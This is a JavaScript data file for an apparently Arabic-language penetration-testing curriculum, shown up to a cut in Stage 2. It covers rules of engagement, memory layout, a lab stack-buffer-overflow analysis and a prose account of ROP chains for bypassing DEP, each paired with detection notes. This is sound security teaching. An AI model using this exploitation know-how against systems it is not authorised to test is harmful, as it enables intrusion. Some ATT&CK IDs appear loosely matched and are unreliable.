// Comprehensive 20-Stage Red Team & Penetration Testing Curriculum
// Aligned with eJPTv2, OSCP, MITRE ATT&CK & Enterprise Red Team Operations
// Exhaustive technical rigor, terminal commands, flag explanations, expected outputs,
// curated YouTube masterclasses, verified TryHackMe rooms, and interactive notes.

export const THEMED_ZONES = [
  { id: 'zone-foundations', nameAr: 'قلعة التأسيس السيبراني', nameEn: 'Cyber Foundations Citadel', stages: [1, 2, 3], color: '#00f3ff', icon: 'ShieldAlert' },
  { id: 'zone-terminal', nameAr: 'برج اللينكس والمختبرات الافتراضية', nameEn: 'Terminal & Virtual Spire', stages: [4, 5, 6], color: '#38bdf8', icon: 'Terminal' },
  { id: 'zone-recon', nameAr: 'مخفر الاستطلاع وفحص الشبكات (eJPTv2)', nameEn: 'Recon & Network Auditing Outpost', stages: [7], color: '#34d399', icon: 'Radar' },
  { id: 'zone-web', nameAr: 'حي أمن الويب والواجهات البرمجية', nameEn: 'Web & API Security Neon District', stages: [8, 9, 10], color: '#f43f5e', icon: 'Globe' },
  { id: 'zone-arenas', nameAr: 'ساحات التحدي والقتال العملي (THM & HTB)', nameEn: 'Colosseum of Cyber Combat', stages: [11, 12], color: '#fbbf24', icon: 'Trophy' },
  { id: 'zone-ad', nameAr: 'حصن أكتيف دايركتوري وكسر الصلاحيات', nameEn: 'Active Directory & Escalation Fortress', stages: [13, 14, 15], color: '#c084fc', icon: 'Lock' },
  { id: 'zone-redteam', nameAr: 'ميدان معارك الريد تيم والتنقل الشبكي (C2 & Pivoting)', nameEn: 'Red Team Warfare, Pivoting & C2', stages: [16], color: '#ef4444', icon: 'Crosshair' },
  { id: 'zone-reporting', nameAr: 'غرفة العمليات، تقييم CVSS والتقارير الاحترافية', nameEn: 'War Room, CVSS & Executive Reporting', stages: [17, 18], color: '#10b981', icon: 'FileText' },
  { id: 'zone-cloud', nameAr: 'واحة السحابة والحاويات الرقمية (Cloud & Containers)', nameEn: 'Cloud & Container Frontier', stages: [19], color: '#06b6d4', icon: 'Cloud' },
  { id: 'zone-capstone', nameAr: 'عرش الجراندمستر ومراوغة الـ EDR (Grandmaster Capstone)', nameEn: 'Grandmaster Capstone & EDR Evasion Apex', stages: [20], color: '#e11d48', icon: 'Award' }
];

export const STAGES_DATA = [
  {
    id: 1,
    zoneId: 'zone-foundations',
    titleAr: 'المرحلة 1: مدخل الأمن السيبراني والأخلاقيات وقوانين الـ Red Team',
    titleEn: 'Stage 1: Introduction to Cyber Security, Ethics & Legal Frameworks',
    tag: 'Foundations',
    difficulty: 'مبتدئ — Beginner',
    xpReward: 150,
    position: { x: -35, y: 0, z: -25 },
    brief: 'فهم الفلسفة الحقيقية للقرصنة الأخلاقية، الفرق الصارم بين الريد تيم والبلو تيم، وثائق قواعد الاشتباك (Rules of Engagement - RoE)، اتفاقيات عدم الإفصاح (NDA)، قوانين الجرائم الإلكترونية، ومبادئ ثالوث أمان المعلومات CIA Triad.',
    whyLearn: 'لا يمكنك البدء في إطلاق أدوات هجومية دون إدراك الإطار القانوني والحدود الفاصلة بين النشاط المهني المصرح به والجريمة الإلكترونية. معرفة كيف يفكر المدافعون والمهاجمون تبني عقلية أمنية سليمة ومحترفة تحميك وتضمن الامتثال القانوني الصارم.',
    professionalApplication: 'في أي شركة استشارات أمنية أو اختبار اختراق مؤسسي، أول خطوة قبل كتابة أمر واحد في التيرمينال هي توقيع وثيقة فحص أمني (Rules of Engagement - RoE) وعقد عدم إفصاح (NDA). تجاوز النطاق المتفق عليه (Out-of-Scope) يعرضك لمساءلة قانونية فورية وفصل من العمل ودعاوى قضائية.',
    caseStudy: 'قضية خبراء اختبار الاختراق من شركة Coalfire (2019) الذين تم القبض عليهم داخل محكمة بولاية آيوا الأمريكية أثناء اختبار أمني فيزيائي ليلي، بسبب تضارب بين وثيقة الـ RoE وتفويض الشرطة المحلية، مما يثبت أن التوثيق القانوني المكتوب هو درع الحماية الأول للمخترق الأخلاقي.',
    commonMistakes: [
      'فحص أو استطلاع أي موقع أو عنوان IP لا تملكه أو لا تملك تفويضاً كتابياً موقعاً وصريحاً لاختباره.',
      'الاعتقاد بأن الهكر هو مجرد تشغيل سكربتات جاهزة دون فهم طبيعة الهدف وتأثير الهجوم على استمرارية العمل (Availability).',
      'إهمال توثيق كل خطوة وأمر وزمن تنفيذه أثناء عملية الاختبار لاستخدامه كدليل في حال وقوع أي عطل في شبكة العميل.'
    ],
    detailedGuide: `
### 1. فلسفة الأمن السيبراني وثالوث CIA
الأمن السيبراني يدور حول حماية الأصول الرقمية، ولكن اختبار الاختراق يبحث عن كيفية كسر هذه الحماية لاكتشاف العيوب ومعالجتها قبل أن يستغلها المخترق الحقيقي.
* **السرية (Confidentiality):** ضمان عدم اطلاع أي شخص غير مصرح له على البيانات الحساسة عبر آليات التشفير والتحكم بالوصول (Access Control).
* **السلامة (Integrity):** ضمان عدم التلاعب بالبيانات أو تزييفها أثناء التخزين أو النقل (Hashes، التواقيع الرقمية).
* **التوافر (Availability):** ضمان بقاء الخدمة تعمل ومتاحة للمستخدمين المصرح لهم دون انقطاع (الحماية من DoS/DDoS، التكرارية والنسخ الاحتياطي).

### 2. أنواع الفرق الأمنية (The Color Teams Matrix)
* **الفريق الأحمر (Red Team):** يمثل المهاجم الافتراضي؛ يحاكي أحدث أساليب الخصم المتطور (Advanced Persistent Threat - APT) لاختبار كفاءة الإجراءات الدفاعية وسرعة رصد الهجوم والتعامل معه.
* **الفريق الأزرق (Blue Team):** يمثل المدافع؛ يراقب السجلات (SIEM)، ويحلل التنبيهات في مركز العمليات الأمنية (SOC)، ويكتب قواعد الـ IDS/IPS لسد الثغرات وإفشال الهجمات.
* **الفريق الأرجواني (Purple Team):** التدريب التشاركي؛ يجلس الريد تيم والبلو تيم معاً لتطوير آليات الكشف والاستجابة بشكل فوري وقياس الفجوات الأمنية.

### 3. وثيقة قواعد الاشتباك (Rules of Engagement - RoE)
قبل أي عملية اختبار اختراق، يجب الاتفاق كتابياً وتوقيع المستند المتضمن:
1. **النطاق المسموح (In-Scope Targets):** عناوين IP محددة، نطاقات ويب فرعية، خوادم محددة بالاسم.
2. **الأنظمة المحظورة (Out-of-Scope Targets):** خوادم قواعد البيانات الحساسة، أجهزة الفوترة، أو خدمات الطرف الثالث السحابية.
3. **أوقات الاختبار المسموحة (Testing Window):** مثل أيام العطل أو الفترات الليلية لتجنب التأثير على ساعات الذروة في الشركات.
4. **طرق الاتصال في حالات الطوارئ (Emergency Escalation Path):** أسماء وأرقام مهندسي العميل للاتصال الفوري في حال توقف أي خدمة حيوية.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'دراسة وتجهيز نموذج وثيقة قواعد الاشتباك (RoE Template)',
        desc: 'تحليل نموذج حقيقي لوثيقة قواعد اشتباك احترافية تتضمن محددات النطاق (Scope)، وتحديد المسؤوليات، وتفويض الوصول المصرح به.',
        command: 'cat << "EOF" > roe_sample.txt\nRULES OF ENGAGEMENT (RoE) - CYBERFORGE ACADEMY\nClient: Local Training Enterprise Lab\nIn-Scope IP Range: 10.10.10.0/24\nOut-of-Scope: 10.10.10.1 (Gateway Router), 10.10.10.254 (Domain DC)\nTesting Window: Mon-Fri 18:00 - 22:00 UTC\nContact: soc-emergency@enterprise.lab | +1-800-555-0199\nEOF\ncat roe_sample.txt',
        flags: [
          { flag: 'In-Scope', explanation: 'النطاق المصرح باختباره رسمياً دون غيره' },
          { flag: 'Out-of-Scope', explanation: 'الأنظمة المحظور لمسها لتفادي تعطل العمليات الحيوية' }
        ],
        expectedOutput: `RULES OF ENGAGEMENT (RoE) - CYBERFORGE ACADEMY
Client: Local Training Enterprise Lab
In-Scope IP Range: 10.10.10.0/24
Out-of-Scope: 10.10.10.1 (Gateway Router), 10.10.10.254 (Domain DC)
Testing Window: Mon-Fri 18:00 - 22:00 UTC
Contact: soc-emergency@enterprise.lab | +1-800-555-0199`,
        proTip: 'في مقابلات العمل واختبارات الشهادات المهنية، يُسأل دائماً: ماذا تفعل لو اكتشفت خادماً خارج النطاق يحوي ثغرة حرجة؟ الجواب الاحترافي: لا تستغله إطلاقاً، بل وثقه فوراً وأبلغ جهة الاتصال الرسمية بالعميل كتابياً.'
      },
      {
        step: 2,
        title: 'إنشاء حسابات التدريب الرسمية الآمنة والقانونية',
        desc: 'التسجيل في منصات التدريب القانونية المعتمدة عالمياً للحصول على معامل افتراضية معزولة دون أي مخاطر قانونية.',
        command: 'echo "منصات التدريب القانونية الرسمية: TryHackMe (tryhackme.com) | Hack The Box (hackthebox.com) | PortSwigger Web Security Academy (portswigger.net)"',
        flags: [
          { flag: 'TryHackMe', explanation: 'منصة لابات موجهة خطوة بخطوة ممتازة لشهادة eJPT' },
          { flag: 'PortSwigger', explanation: 'أقوى معمل مجاني في العالم لأمن وتطبيقات الويب' }
        ],
        expectedOutput: `منصات التدريب القانونية الرسمية: TryHackMe (tryhackme.com) | Hack The Box (hackthebox.com) | PortSwigger Web Security Academy (portswigger.net)`,
        proTip: 'أنشئ حساباً مخصصاً لتدريبك الأمني بإيميل احترافي واستخدمه لبناء ملف إنجازات (Portfolio) يعرض الغرف والتحديات التي أنجزتها.'
      }
    ],
    youtubeVideos: [
      {
        title: 'How to Become an Ethical Hacker in 2026 (Complete Roadmap)',
        channel: 'NetworkChuck',
        duration: '22 دقيقة',
        url: 'https://www.youtube.com/watch?v=sWbGOq-IrN4',
        keyTakeaway: 'شرح المسار الواقعي للبدء في الهكر الأخلاقي والشهادات المعتمدة وأهمية الأخلاقيات والقوانين.'
      },
      {
        title: 'Day in the Life of a Penetration Tester / Red Teamer',
        channel: 'The Cyber Mentor',
        duration: '18 دقيقة',
        url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
        keyTakeaway: 'نظرة واقعية من داخل شركة اختبار اختراق حول كيفية إجراء الاختبارات والتعامل مع العملاء والوثائق.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Intro to Ethical Hacking', url: 'https://tryhackme.com/r/room/introtoethicalhacking', difficulty: 'Easy', whyMatters: 'يعطيك الانطلاقة الأولى لفهم أخلاقيات المجال وثالوث الأمان وقوانين الحماية.' },
      { name: 'Careers in Cyber', url: 'https://tryhackme.com/r/room/careersincyber', difficulty: 'Easy', whyMatters: 'يشرح الأدوار الوظيفية المختلفة ومسارات الترقي في الريد تيم والبلو تيم وسوق العمل.' }
    ],
    writeup: {
      title: 'اتفاقية اختبار اختراق معتمدة وتحديد قواعد الاشتباك (Rules of Engagement Case Study)',
      scenario: 'محاكاة تعاقدية واقعية مع مؤسسة مالية: إعداد وثيقة قواعد الاشتباك (RoE)، حصر الأصول المسموح باختبارها (In-Scope)، استبعاد أنظمة الدفع الحرجة (Out-of-Scope)، وتحديد نوافذ التنبيه والطوارئ لمنع توقف الأعمال.',
      steps: [
        {
          phase: 'Phase 01: Scope Definition',
          title: 'تحديد نطاق الاختبار وحصر الأصول بدقة',
          action: 'تم عقد ورشة عمل مع فريق أمن المعلومات والـ CISO لحصر النطاقات وعناوين الـ IP المعتمدة للاختبار، وتوثيق أرقام الـ CIDR الخاصة ببيئة الـ Staging، واستبعاد خوادم قواعد بيانات الإنتاج والـ Swift Network تماماً منعاً لأي تعطيل.',
          detection: 'تقوم فرق الـ GRC والامتثال بمطابقة الأصول المستهدفة في تقارير الفحص مع سجلات حصر الأصول (CMDB) للتحقق من عدم شمول أي أصل غير مصرح أو مملوك لطرف ثالث.',
          mitreId: 'T1596',
          link: 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
          linkText: 'دليل NIST SP 800-115 الإرشادي الفني لاختبارات وتدقيق أمان المعلومات'
        },
        {
          phase: 'Phase 02: Third-Party & Cloud Assets Validation',
          title: 'التحقق من ملكية الأصول واستبعاد خدمات الاستضافة الخارجية',
          action: 'فحص نطاقات الـ DNS وعناوين الـ IP عبر سجلات WHOIS و BGP Looking Glass للتأكد من أنها تتبع للعميل وليست تابعة لشركات SaaS أو خدمات طرف ثالث مستضافة تتطلب إذناً كتابياً منفصلاً من موفر الخدمة.',
          detection: 'ترصد أنظمة إدارة السحابة والتحكم (CSPM) طلبات اختبار غير معلنة وتخطر موفري السحابة بموجب سياسات الـ Shared Responsibility Model.',
          mitreId: 'T1590',
          link: 'https://owasp.org/www-project-web-security-testing-guide/',
          linkText: 'دليل OWASP Web Security Testing Guide لإدارة وضبط نطاق الاختبار'
        },
        {
          phase: 'Phase 03: Communication Protocol & Emergency Triggers',
          title: 'إنشاء قنوات الاتصال المشفرة وخطوط الطوارئ السريعة',
          action: 'تم اعتماد قناة مراسلة مشفرة عبر Signal وبريد PGP مخصص بين قائد فريق الريد تيم ومدير الـ SOC للتنسيق الفوري في حال رصد استغلال أمني حرج أو حدوث انهيار غير مقصود لأي خدمة لتفعيل زر التوقف الفوري (Kill-Switch).',
          detection: 'يتم اختبار خطة الاستجابة للطوارئ (Incident Response Testing) بمحاكاة تنبيه عالي الخطورة ومراقبة زمن الاستجابة (MTTR) بين الفريقين.',
          mitreId: 'T1008',
          link: 'https://www.sans.org/white-papers/guidance-for-penetration-testing/',
          linkText: 'إرشادات معهد SANS لصياغة وثائق قواعد الاشتباك وتدابير الطوارئ'
        },
        {
          phase: 'Phase 04: Legal Sign-off & RoE Ratification',
          title: 'التوقيع التنفيذي والاعتماد القانوني الصريح',
          action: 'توقيع وثيقة الـ Statement of Work (SOW) ووثيقة الـ RoE رسمياً من المسؤول المفوض قانونياً وتوثيق التواريخ والـ IP Ranges لفريق الاختبار لتفادي الوقوع تحت طائلة قوانين مكافحة جرائم تقنية المعلومات.',
          detection: 'تحتفظ الإدارة القانونية وفرق الحوكمة بنسخة معتمدة ومختومة يتم الرجوع إليها في حال حدوث أي مساءلة قضائية أو تدقيق تنظيمي دولي (مثل PCI-DSS و ISO 27001).',
          mitreId: 'T1583',
          link: 'https://attack.mitre.org/matrices/enterprise/',
          linkText: 'إطار MITRE ATT&CK لتصنيف مراحل وتقنيات العمليات السيبرانية'
        }
      ],
      lessonLearned: 'الاختبار الأمني بدون تفويض خطي صريح موقع من صاحب الصلاحية القانونية يعتبر جناية قانونية كاملة الأركان. وثيقة RoE الدقيقة هي الحصن القانوني والمهني لفريق الاختبار والعميل معاً.'
    },
    secretTradecraft: [
      {
        title: 'التحكم الذكي بمعدل الفحص (Scan Rate-Limiting & SLA Preservation)',
        mitreId: 'T1029',
        category: 'Operational Safety & Availability',
        explanation: 'لتجنب التسبب في انهيار خوادم العميل أو إشباع موارد الشبكة أثناء اختبارات النطاق الواسع، يتم ضبط أدوات الفحص مثل Nmap أو Masscan بمعدلات حزم محددة (مثل --max-rate 300) وتفعيل تأخيرات زمنية عشوائية (Jitter) للحفاظ على استقرار الخدمة وتجنب حرمان المستخدمين الشرعيين من الوصول.',
        detection: 'ترصد فرق الـ SOC ومنظومات WAF/DDoS هذا الأسلوب عبر قياس كثافة الطلبات في الثانية ومطابقتها مع مؤشرات السلوك الشبكي الطبيعي للبنية التحتية.',
        link: 'https://nmap.org/book/man-performance.html',
        linkText: 'الدليل الرسمي لضبط أداء ومعدلات إرسال الحزم في أداة Nmap'
      },
      {
        title: 'سلسلة حيازة الأدلة وتشفير البراهين (Chain of Custody & Hash Proofing)',
        mitreId: 'T1565.001',
        category: 'Evidence Integrity & Professional Reporting',
        explanation: 'جميع الأدلة واللقطات الرقمية وملفات الـ Logs التي تثبت وجود الثغرات يجب توثيقها مع الـ SHA-256 Hash الخاص بها فور التقاطها وتخزينها في مستودع مشفر (AES-256)، لمنع أي ادعاء بتعديل الأدلة أو التشكيك في نزاهة النتائج.',
        detection: 'يتم فحص ومطابقة الهاشات من قبل المراجعين الخارجيين والمدققين الجنائيين للتحقق من عدم تعرض الأدلة للعبث.',
        link: 'https://csrc.nist.gov/publications/detail/sp/800-86/final',
        linkText: 'دليل NIST SP 800-86 لدمج التقنيات الجنائية الرقمية في إدارة الحوادث'
      },
      {
        title: 'إثبات الأثر الأمني الآمن (Safe Proof of Concept vs DoS)',
        mitreId: 'T1499',
        category: 'Non-Destructive Exploitation',
        explanation: 'في اختبارات الاختراق المعتمدة، لا يتم أبداً استغلال الثغرات بطريقة مدمرة مثل مسح جداول البيانات أو إغراق الذاكرة (Crash)، بل يتم الاكتفاء بإنشاء ملف تجريبي محايد (مثل مناداة id أو whoami أو كتابة ملف بريء في /tmp) لإثبات إمكانية تنفيذ الكود دون التأثير على بيئة الإنتاج.',
        detection: 'يرصد الـ SOC استدعاء أوامر الاستكشاف البسيطة في سجلات الـ Audit Logs ويتم تصنيفها كـ Proof-of-Concept غير مؤذية مع تسجيل وقت المحاولة.',
        link: 'https://owasp.org/www-project-vulnerability-management-guide/',
        linkText: 'إرشادات OWASP لإثبات وتوثيق الثغرات الأمنية دون إضرار'
      }
    ],
    checklist: [
      { id: 'c1_1', text: 'فهم الفرق الصارم بين القرصنة القانونية المصرح بها والجرائم الإلكترونية وعقوباتها.' },
      { id: 'c1_2', text: 'استيعاب ثالوث الأمان (CIA Triad) ومبادئ AAA (Authentication, Authorization, Accounting).' },
      { id: 'c1_3', text: 'إتقان بنية وثيقة قواعد الاشتباك (RoE) وتحديد محددات النطاق In-Scope و Out-of-Scope.' }
    ],
    officialResources: [
      { name: 'OWASP Foundation Official Standards', url: 'https://owasp.org', type: 'Documentation' },
      { name: 'NIST Computer Security Resource Center (SP 800-115)', url: 'https://csrc.nist.gov', type: 'Standards' },
      { name: 'MITRE ATT&CK Framework Enterprise Matrix', url: 'https://attack.mitre.org', type: 'Framework' }
    ]
  },

  {
    id: 2,
    zoneId: 'zone-foundations',
    titleAr: 'المرحلة 2: معمارية الحاسب والأنظمة الداخلية (Computer Architecture & OS Internals)',
    titleEn: 'Stage 2: Computer Architecture, Memory Layout & OS Internals',
    tag: 'Foundations',
    difficulty: 'مبتدئ إلى متوسط',
    xpReward: 200,
    position: { x: -25, y: 0, z: -25 },
    brief: 'فهم العتاد والأنظمة من الداخل: المعالج (CPU)، الذاكرة العشوائية ومخططاتها (Stack & Heap)، سجلات المعالج x86_64 Registers، وكيف تنفذ أنظمة التشغيل (Windows & Linux) العمليات والتعليمات البرمجية.',
    whyLearn: 'بدون معرفة كيف يعمل المعالج وتوزيع الذاكرة، لن تفهم أبداً ثغرات فيضان الذاكرة (Buffer Overflow)، حقن العمليات (Process Injection)، أو كيفية عمل ثغرات كسر الصلاحيات في النواة (Kernel Exploits). الريد تيمر المحترف يعرف ماذا يحدث في الذاكرة بالبايت.',
    professionalApplication: 'يستخدمها مهندسو الريد تيم في تحليل البرمجيات الخبيثة، وتجاوز أنظمة الحماية EDR/AV عبر تشغيل الـ Payloads مباشرة في ذاكرة العمليات الشرعية لتفادي كتابة ملفات مشبوهة على القرص الصلب (Fileless Attacks).',
    caseStudy: 'ثغرة EternalBlue (MS17-010) التي تسببت في وباء فدية WannaCry استغلت خللاً في إدارة ذاكرة بروتوكول SMBv1 في نواة نظام ويندوز، مما سمح للمهاجمين بالتحكم في مؤشر التعليمات وتنفيذ أكواد خبيثة بصلاحيات SYSTEM دون مصادقة.',
    commonMistakes: [
      'افتراض أن الـ RAM مجرد مساحة موحدة دون فهم الفرق الجذري بين مقطع الكود (.text) والـ Stack والـ Heap.',
      'تجاهل الفرق بين معماريات 32-bit و 64-bit وطريقة تمرير المعاملات في السجلات (Calling Conventions).'
    ],
    detailedGuide: `
### 1. سجلات المعالج (CPU Registers في معمارية 64-bit)
* **RIP (Instruction Pointer):** المؤشر الذي يحمل عنوان التعليمة البرمجية التالية المراد تنفيذها — السيطرة عليه تعني السيطرة على مسار تنفيذ البرنامج بالكامل!
* **RSP (Stack Pointer):** يشير دائماً إلى قمة الـ Stack الحالي، وتتغير قيمته مع عمليات PUSH و POP.
* **RBP (Base Pointer / Frame Pointer):** يشير إلى قاعدة إطار الدالة الحالية (Stack Frame) لحفظ المتغيرات المحلية وعناوين الرجوع.
* **RAX, RBX, RCX, RDX:** سجلات الأغراض العامة المستخدمة في الحسابات وتمرير المعاملات للدوال وقيم الإرجاع (Return Values).

### 2. تخطيط الذاكرة للعملية (Process Memory Layout)
عندما يتم تشغيل برنامج تنفيذي في الذاكرة، يقسمه نظام التشغيل إلى 4 مقاطع رئيسية:
1. **مقطع الكود (.text):** يحتوي على تعليمات الآلة المترجمة (Machine Code) وهو للقراءة والتنفيذ فقط لمنع تعديل الكود أثناء التشغيل.
2. **مقطع البيانات (.data / .bss):** يحتوي على المتغيرات العامة والثابتة في البرنامج.
3. **الـ Heap:** مساحة الذاكرة الديناميكية المخصصة أثناء تشغيل البرنامج (عبر malloc في C أو new في C++) وتنمو للأعلى باتجاه العناوين العليا.
4. **الـ Stack:** الذاكرة المخصصة للدوال السريعة والمتغيرات المحلية وعناوين الرجوع (Return Addresses)، وتنمو للأسفل باتجاه العناوين الدنيا.

### 3. مستويات الصلاحية في المعالج (Privilege Rings)
* **User Mode (Ring 3):** تعمل فيه التطبيقات العادية والمتصفحات. لا تملك صلاحية الوصول المباشر للعتاد أو الذاكرة المحمية للأنظمة الأخرى، وتعتمد على استدعاءات النظام (System Calls).
* **Kernel Mode (Ring 0):** قلب نظام التشغيل؛ يملك تحكماً مطلقاً بكل العتاد والذاكرة، وهو الهدف الأسمى لأي مهاجم أو مختبر اختراق يحاول تصعيد الصلاحيات (Privilege Escalation).
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'فحص العمليات والذاكرة في لينكس عبر مسار /proc',
        desc: 'استكشاف كيف يمثل نواة لينكس كل برنامج يشتغل في الذاكرة كمجلد في مسار /proc وقراءة مخطط الذاكرة للعملية.',
        command: 'cat /proc/$$/maps | head -n 12',
        flags: [
          { flag: '$$', explanation: 'متغير باش يعبر عن الـ PID للشيل الحالي' },
          { flag: 'maps', explanation: 'ملف يعرض عناوين الذاكرة المخصصة للـ Text والـ Stack والـ Heap والمكتبات' }
        ],
        expectedOutput: `55c829e00000-55c829e3a000 r--p 00000000 08:01 262148 /usr/bin/bash
55c829e3a000-55c829ee1000 r-xp 0003a000 08:01 262148 /usr/bin/bash
7ffd25e4c000-7ffd25e6e000 rw-p 00000000 00:00 0          [stack]
7ffd25ff5000-7ffd25ff9000 r--p 00000000 00:00 0          [vvar]
7ffd25ff9000-7ffd25ffb000 r-xp 00000000 00:00 0          [vdso]`,
        proTip: 'لاحظ الأذونات r-xp: الحرف x يعني Executable، وتطبيقه على مقطع الكود فقط هو حماية تسمى DEP/NX تمنع تنفيذ الأكواد في الـ Stack لمنع ثغرات الـ Buffer Overflow الكلاسيكية.'
      },
      {
        step: 2,
        title: 'فحص العمليات الحية وشجرة الأبناء عبر ps و htop',
        desc: 'مراقبة تسلسل ولادة العمليات (Parent-Child Process Trees) في نظام التشغيل لكشف البرمجيات الخبيثة والشيلات الخلفية.',
        command: 'ps -ef --forest | head -n 15',
        flags: [
          { flag: '-ef', explanation: 'عرض كل العمليات الحية مع تفاصيل المستخدم والمسار' },
          { flag: '--forest', explanation: 'رسم شجرة العلاقات بين العملية الأب والعمليات الأبناء بصرياً' }
        ],
        expectedOutput: `UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 08:00 ?        00:00:02 /sbin/init
root         420       1  0 08:01 ?        00:00:00 /lib/systemd/systemd-journald
root         650       1  0 08:01 ?        00:00:00 /usr/sbin/sshd -D
root        1200     650  0 08:30 ?        00:00:00  \\_ sshd: student [priv]
student     1205    1200  0 08:30 pts/0    00:00:00      \\_ -bash`,
        proTip: 'في الريد تيم، عندما تشاهد عملية مثل powershell.exe أو cmd.exe ولدت من عملية winword.exe (برنامج Word)، فهذا مؤشر قطعي على وجود مستند ماكرو خبيث تم تشغيله!'
      }
    ],
    youtubeVideos: [
      {
        title: 'CPU Registers & Memory Architecture for Ethical Hackers',
        channel: 'David Bombal',
        duration: '26 دقيقة',
        url: 'https://www.youtube.com/watch?v=lb1Dw0elw0Q',
        keyTakeaway: 'شرح عملي ومبسط لحركة البيانات بين المعالج والـ Stack وكيف يستغلها مهندسو الاختراق.'
      },
      {
        title: 'Buffer Overflow Vulnerability Step-by-Step Tutorial',
        channel: 'The Cyber Mentor',
        duration: '35 دقيقة',
        url: 'https://www.youtube.com/watch?v=kHg_mQy2RCE',
        keyTakeaway: 'تطبيق عملي كامل على الكتابة فوق مسجل EIP/RIP واستبدال عنوان العودة للسيطرة على البرنامج.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Windows Internals', url: 'https://tryhackme.com/r/room/windowsinternals', difficulty: 'Medium', whyMatters: 'شرح معمق لـ Processes, Threads, Handles, PE Headers ومستويات الصلاحيات.' },
      { name: 'Intro to x86-64', url: 'https://tryhackme.com/r/room/introtox8664', difficulty: 'Medium', whyMatters: 'أساسيات الأسمبلي وسجلات المعالج اللازمة لعكس البرمجيات وتخطي الحمايات.' }
    ],
    writeup: {
      title: 'تحليل ثغرة تدفق الذاكرة الكلاسيكية واستعادة مسار التنفيذ (Stack Buffer Overflow Analysis)',
      scenario: 'تحليل ثغرة تدفق مكدس (Stack-based Buffer Overflow) في تطبيق C خادم غير آمن داخل معمل تدريبي: توليد الـ Pattern لتحديد الـ Offset الدقيق لمسجل مؤشر التعليمات (EIP/RIP)، وفحص كيفية اكتشاف أنظمة التشغيل لمحاولات تجاوز حدود الذاكرة.',
      steps: [
        {
          phase: 'Phase 01: Binary Disassembly & Unsafe Function Discovery',
          title: 'الهندسة العكسية واكتشاف الدوال غير الآمنة في الكود',
          action: 'باستخدام أدوات التحليل الثابت (Ghidra و objdump)، تم فحص ملف الـ ELF/PE وتبين استخدام دالة strcpy غير الآمنة لاستقبال المدخلات في مصفوفة محجوزة بحجم 64 بايت في الـ Stack دون التحقق من طول المدخلات (No Bounds Checking).',
          detection: 'تقوم أدوات فحص الكود المصدري الثابت (SAST) مثل SonarQube و Semgrep برصد استخدام الدوال المحظورة (strcpy, gets, sprintf) وإطلاق تنبيهات أمنية فورية أثناء مرحلة التطوير.',
          mitreId: 'T1203',
          link: 'https://cwe.mitre.org/data/definitions/121.html',
          linkText: 'توثيق CWE-121 الرسمي لثغرات تدفق مكدس الذاكرة (Stack-based Buffer Overflow)'
        },
        {
          phase: 'Phase 02: Pattern Fuzzing & Offset Calculation',
          title: 'إرسال نمط تكراري وحساب إزاحة مسجل مؤشر التعليمات',
          action: 'تم إرسال نمط تكراري دوري (Cyclic Pattern) باستخدام أدوات مصحح الأخطاء GDB و Peda/Pwndbg لتحديد الإزاحة الدقيقة (Exact Offset) التي تسببت في انهيار البرنامج والكتابة فوق الـ Saved Frame Pointer (RBP) ومسجل العودة (RIP).',
          detection: 'ترصد أنظمة التشغيل انهيار التطبيقات عبر سجلات Windows Event ID 1000 (Application Error) أو Linux kernel core dumps في /var/log/messages مع رمز SIGSEGV (Signal 11: Segmentation Fault).',
          mitreId: 'T1203',
          link: 'https://github.com/pwndbg/pwndbg',
          linkText: 'مستودع Pwndbg المتقدم لتحليل وتصحيح أخطاء الذاكرة والـ Exploit Development'
        },
        {
          phase: 'Phase 03: Control Flow Hijacking Verification',
          title: 'التحقق من التحكم الكامل في مسجل EIP/RIP',
          action: 'تمت صياغة مدخل تجريبي ينتهي بقيمة عنوان دالة آمنة داخل البرنامج (Ret2Win) للتأكد من القدرة على إعادة توجيه مسار تنفيذ المعالج دون التسبب في Crash عشوائي للبرنامج.',
          detection: 'ترصد تقنيات معالجات Intel الحديثة مثل Intel Control-flow Enforcement Technology (CET) وميزة Shadow Stack أي محاولة لتغيير عنوان العودة وتوقف البرنامج فورياً برمز تنبيه أمني.',
          mitreId: 'T1203',
          link: 'https://attack.mitre.org/techniques/T1203/',
          linkText: 'توثيق تقنيات استغلال ثغرات البرمجيات في إطار MITRE ATT&CK'
        },
        {
          phase: 'Phase 04: Modern Mitigations & Compiler Defenses',
          title: 'تطبيق دفاعات الـ Compiler وإحباط الاستغلال',
          action: 'إعادة بناء البرنامج مع تفعيل حماية Stack Canaries (-fstack-protector-all) وتفعيل الـ ASLR لمنع استقرار العناوين، وتفعيل خيار الـ Non-Executable Stack (DEP/NX) لحظر تنفيذ أي كود داخل الـ Stack.',
          detection: 'في حال محاولة الاستغلال بعد التفعيل، يصدر النظام تنبيه: *** stack smashing detected ***: terminated ويتم إنهاء الـ Process فوراً دون إتاحة أي فرصة للتحكم في مسار الكود.',
          mitreId: 'T1562.001',
          link: 'https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html',
          linkText: 'دليل خيارات الحماية والتأمين لمترجم GCC ضد التلاعب بالذاكرة'
        }
      ],
      lessonLearned: 'لا يمكن الاعتماد على حذر المبرمج في لغات C/C++؛ الحل الجذري هو استخدام لغات برمجية آمنة في إدارة الذاكرة (Memory-Safe Languages مثل Rust و Go)، أو فرض الـ Bounds Checking الصارم وتفعيل آليات ASLR و DEP و Stack Canaries على كل المكتبات.'
    },
    secretTradecraft: [
      {
        title: 'سلاسل ROP Chains لتجاوز حظر تنفيذ الذاكرة (Return-Oriented Programming)',
        mitreId: 'T1055',
        category: 'Binary Exploitation Mechanics',
        explanation: 'عند تفعيل خاصية Data Execution Prevention (DEP/NX)، لا يمكن للمعالج تنفيذ أي تعليمات داخل منطقة الـ Stack. للتغلب على ذلك، يبحث مهندسو الأمان عن أجزاء كود شرعية موجودة مسبقاً داخل الـ Binaries أو المكتبات (مثل ntdll أو libc) تنتهي بتعليمة RET تُعرف بـ Gadgets، ويتم ربطها معاً لتنفيذ استدعاء VirtualProtect أو mprotect لتغيير تصريح الذاكرة إلى قابل للتنفيذ (Executable).',
        detection: 'ترصد حلول الـ EDR وسجلات المعالج الحديثة (Hardware LBR - Last Branch Record) تسلسل تعليمات RET السريع وغير المنطقي الذي يميز سلاسل ROP، مما يشير إلى هجوم اختطاف مسار المعالج.',
